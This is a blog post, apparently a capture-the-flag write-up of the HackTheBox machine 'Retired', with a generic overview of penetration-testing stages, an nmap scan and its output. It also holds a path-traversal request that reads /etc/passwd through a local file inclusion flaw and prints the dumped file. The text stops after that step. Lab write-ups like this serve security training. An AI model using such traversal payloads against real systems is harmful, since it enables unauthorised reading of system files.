<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="HTB/Retired - writeup" /><meta name="author" content="Farrim Wildaxe" /><meta property="og:locale" content="en" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="https://farrim.re/posts/htb-retired/" /><meta property="og:url" content="https://farrim.re/posts/htb-retired/" /><meta property="og:site_name" content="Farrim’s blog" /><meta property="og:image" content="https://farrim.re/assets/img/htb/retired/retired.png" /><meta property="og:image:height" content="516" /><meta property="og:image:width" content="700" /><meta property="og:image:alt" content="image alternative text" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-03-30T00:33:38+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://farrim.re/assets/img/htb/retired/retired.png" /><meta name="twitter:image:alt" content="image alternative text" /><meta property="twitter:title" content="HTB/Retired - writeup" /><meta name="twitter:site" content="@farrimwildaxe" /><meta name="twitter:creator" content="@farrimwildaxe" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Farrim Wildaxe","url":"https://farrim.re"},"dateModified":"2023-03-30T13:25:09+00:00","datePublished":"2023-03-30T00:33:38+00:00","description":"Introduction","headline":"HTB/Retired - writeup","image":{"width":700,"height":516,"alt":"image alternative text","url":"https://farrim.re/assets/img/htb/retired/retired.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://farrim.re/posts/htb-retired/"},"url":"https://farrim.re/posts/htb-retired/"}</script><title>HTB/Retired - writeup | Farrim's blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Farrim's blog"><meta name="application-name" content="Farrim's blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end">
<div class="profile-wrapper text-center">
<div id="avatar"> <a href="/" class="mx-auto"> <img src="https://farrim.re/assets/farrimwildaxe.jpg" alt="avatar" onerror="this.style.display='none'"> </a>
</div>
<div class="site-title"> <a href="/">Farrim's blog</a>
</div>
<div class="site-subtitle font-italic"></div>
</div>
<ul class="w-100">
<li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a>
</li>
<li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a>
</li>
<li class="nav-item"> <a href="/writeups/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>WRITEUPS</span> </a>
</li>
<li class="nav-item"> <a href="/research/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>RESEARCH</span> </a>
</li>
<li class="nav-item"> <a href="/disclaimer/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>DISCLAIMER</span> </a>
</li>
<li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a>
</li>
<li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a>
</li>
<li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a>
</li>
</ul>
<div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/farrimwildaxe" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/farrimwildaxe" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href%20=%20'mailto:'%20+%20['FarrimWildaxe','protonmail.com'].join('@')" aria-label="email"> <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss"> <i class="fas fa-rss"></i> </a>
</div>
</div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HTB/Retired - writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div>
<i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel">Cancel</span>
</div></div><div id="main-wrapper" class="d-flex justify-content-center">
<div id="main" class="container pl-xl-4 pr-xl-4">
<div class="row">
<div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2">
<h1 data-toc-skip>HTB/Retired - writeup</h1>
<div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1680136418" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 30, 2023 </em> </span> <span> Updated <em class="" data-ts="1680182709" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 30, 2023 </em> </span><div class="mt-3 mb-3"> <a href="/assets/img/htb/retired/retired.png" class="popup img-link preview-img shimmer"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201200%20630'%3E%3C/svg%3E" data-src="/assets/img/htb/retired/retired.png" alt="image alternative text" width="1200" height="630" class="lazyload" data-proofer-ignore></a><figcaption class="text-center pt-2 pb-2">image alternative text</figcaption>
</div>
<div class="d-flex justify-content-between"> <span> By <em> <a href="https://farrim.re">Farrim Wildaxe</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4514 words"> <em>25 min</em> read</span>
</div>
</div>
</div>
<div class="post-content">
<h2 id="introduction">
<span class="mr-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
</h2>
<p>In cybersecurity, hands-on experience is essential for developing practical skills and knowledge. One of the best ways to gain this experience is by participating in capture-the-flag (CTF) challenges and solving challenges on platforms like HackTheBox. HackTheBox is a popular platform for practising and developing penetration testing skills, featuring a wide range of virtual machines with various difficulty levels.</p>
<p>One of the most exciting and challenging HackTheBox machines is “Retired”, which requires a deep understanding of penetration testing methodologies and techniques to solve. This blog post will explore the Retired box in detail, discussing its background, methodology, and solutions to help aspiring penetration testers and security researchers improve their skills and knowledge.</p>
<p>We can solve the “Retired” box in the following steps: enumeration, exploitation, lateral movement and privilege escalation. Below is a short description of each stage.</p>
<p>Enumeration is a crucial stage in penetration testing, where the tester tries to identify and gather information about the target system, network, or application. This stage involves actively probing the target to discover the system’s services, open ports, and other details about the operating system and its configuration. Enumeration gives the tester valuable insights into the target’s architecture, which can be used to develop an attack strategy and exploit potential vulnerabilities. An efficient enumeration process involves using various tools and techniques, including port scanning, banner grabbing, and network mapping, to identify weaknesses and misconfigurations that can be exploited to gain unauthorised access.</p>
<p>The exploitation stage is the process in penetration testing where the tester attempts to take advantage of the vulnerabilities found during the previous steps to gain unauthorised access to the target system, network or application. This stage requires a thorough understanding of the target environment and the vulnerabilities discovered during the reconnaissance and enumeration stages. The exploitation stage involves using various tools and techniques to exploit the identified vulnerabilities, such as buffer overflow, SQL injection, and remote code execution. This stage aims to gain access to sensitive information, escalate privileges, or take control of the target system. The success of the exploitation stage will depend on the tester’s ability to craft a suitable exploit that can bypass any security mechanisms.</p>
<p>Lateral movement is a critical stage in the penetration testing process that involves an attacker’s ability to move from one compromised system to another within the target network or from one user account to another. Lateral movement often follows the initial exploitation stage, where the attacker gains access to the target system. The attacker then looks for ways to move laterally to other systems or accounts within the network, using the same or different techniques as the initial exploitation. Lateral movement is a significant concern for organisations since it can allow attackers to access and control more sensitive information and make it more challenging for defenders to track and contain the attack. During a penetration testing engagement, lateral movement simulates a real-world attack and assesses the target’s overall security posture, including access controls, network segmentation, and incident response capabilities.</p>
<p>The privilege escalation stage in penetration testing involves attempting to escalate privileges on the target system or application. This stage is typically conducted after the initial exploitation, and access to the target has been achieved. The goal of the privilege escalation stage is to elevate the access level of the tester to gain administrative or system-level access, which can allow for deeper access and control of the target environment. The privilege escalation stage may involve identifying and exploiting misconfigured permissions, vulnerabilities, or configuration settings that can be used to obtain higher privileges. This stage is critical in penetration testing because it allows the tester to assess the potential damage that could be caused if an attacker gains elevated privileges in a real-world attack.</p>
<h2 id="enumeration">
<span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
</h2>
<p>Our first step is a port scan with nmap. This will inform us about the operating system and services on the target host:</p>
<div class="language-bash highlighter-rouge">
<div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sSVC</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">-Pn</span> <span class="nt">-T5</span> <span class="nt">-p-</span> 10.129.194.147
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-04-02 17:52 EDT
Warning: 10.129.194.147 giving up on port because retransmission cap hit <span class="o">(</span>2<span class="o">)</span><span class="nb">.</span> Nmap scan report <span class="k">for </span>10.129.194.147
Host is up <span class="o">(</span>0.077s latency<span class="o">)</span><span class="nb">.</span> Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 <span class="o">(</span>RSA<span class="o">)</span>
|   256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx
| http-title: Agency - Start Bootstrap Theme
|_Requested resource was /index.php?page<span class="o">=</span>default.html
Aggressive OS guesses: Linux 5.0 <span class="o">(</span>95%<span class="o">)</span>, Linux 5.0 - 5.4 <span class="o">(</span>95%<span class="o">)</span>, Linux 5.4 <span class="o">(</span>94%<span class="o">)</span>, HP P2000 G3 NAS device <span class="o">(</span>93%<span class="o">)</span>, Linux 4.15 - 5.6 <span class="o">(</span>93%<span class="o">)</span>, Linux 5.3 - 5.4 <span class="o">(</span>93%<span class="o">)</span>, Linux 2.6.32 <span class="o">(</span>92%<span class="o">)</span>, Infomir MAG-250 set-top box <span class="o">(</span>92%<span class="o">)</span>, Ubiquiti AirMax NanoStation WAP <span class="o">(</span>Linux 2.6.32<span class="o">)</span> <span class="o">(</span>92%<span class="o">)</span>, Linux 5.0 - 5.3 <span class="o">(</span>92%<span class="o">)</span>
No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span> Network Distance: 2 hops
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE <span class="o">(</span>using port 587/tcp<span class="o">)</span>
HOP RTT      ADDRESS
1   71.53 ms 10.10.16.1
2   35.51 ms 10.129.194.147

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span> Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>336.33 seconds
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>We see two ports opened, SSH and HTTP. Let’s check HTTP one in a browser. We can see a suspicious part in the URL when the page is visible:</p>
<p><a href="/assets/img/htb/retired/page.png" class="popup img-link "><img data-src="/assets/img/htb/retired/page.png" alt="Webpage with LFI" class="lazyload" data-proofer-ignore></a></p>
<p>It looks like LFI, and we can confirm it by including some files from the host filesystem:</p>
<div class="language-python highlighter-rouge">
<div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre></td>
<td class="rouge-code"><pre><span class="err">$</span> <span class="n">http</span> <span class="o">-</span><span class="n">v</span> <span class="sh">'</span><span class="s">http://retired.htb/index.php?page=../../../../../../../../../../etc/passwd</span><span class="sh">'</span>
<span class="n">GET</span> <span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="err">?</span><span class="n">page</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">Accept</span><span class="p">:</span> <span class="o">*/*</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
<span class="n">Connection</span><span class="p">:</span> <span class="n">keep</span><span class="o">-</span><span class="n">alive</span>
<span class="n">Host</span><span class="p">:</span> <span class="n">retired</span><span class="p">.</span><span class="n">htb</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">HTTPie</span><span class="o">/</span><span class="mf">2.6</span><span class="p">.</span><span class="mi">0</span>

<span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">302</span> <span class="n">Found</span>
<span class="n">Connection</span><span class="p">:</span> <span class="n">keep</span><span class="o">-</span><span class="n">alive</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="n">Date</span><span class="p">:</span> <span class="n">Sat</span><span class="p">,</span> <span class="mi">02</span> <span class="n">Apr</span> <span class="mi">2022</span> <span class="mi">21</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="mi">27</span> <span class="n">GMT</span>
<span class="n">Location</span><span class="p">:</span> <span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="err">?</span><span class="n">page</span><span class="o">=</span><span class="n">default</span><span class="p">.</span><span class="n">html</span>
<span class="n">Server</span><span class="p">:</span> <span class="n">nginx</span>
<span class="n">Transfer</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">chunked</span>

<span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="nb">bin</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">sys</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="n">sys</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">sync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">sync</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sync</span>
<span class="n">games</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">man</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">lp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="n">lp</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">mail</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">news</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">uucp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">proxy</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">backup</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">backup</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">backups</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="nb">list</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="n">Mailing</span> <span class="n">List</span> <span class="n">Manager</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="nb">list</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">irc</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">gnats</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="n">Gnats</span> <span class="n">Bug</span><span class="o">-</span><span class="n">Reporting</span> <span class="nc">System </span><span class="p">(</span><span class="n">admin</span><span class="p">):</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gnats</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">nobody</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">nobody</span><span class="p">:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">_apt</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">101</span><span class="p">:</span><span class="mi">101</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Time</span> <span class="n">Synchronization</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Network</span> <span class="n">Management</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Resolver</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">messagebus</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="mi">105</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">_chrony</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="mi">112</span><span class="p">:</span><span class="n">Chrony</span> <span class="n">daemon</span><span class="p">,,,:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">chrony</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
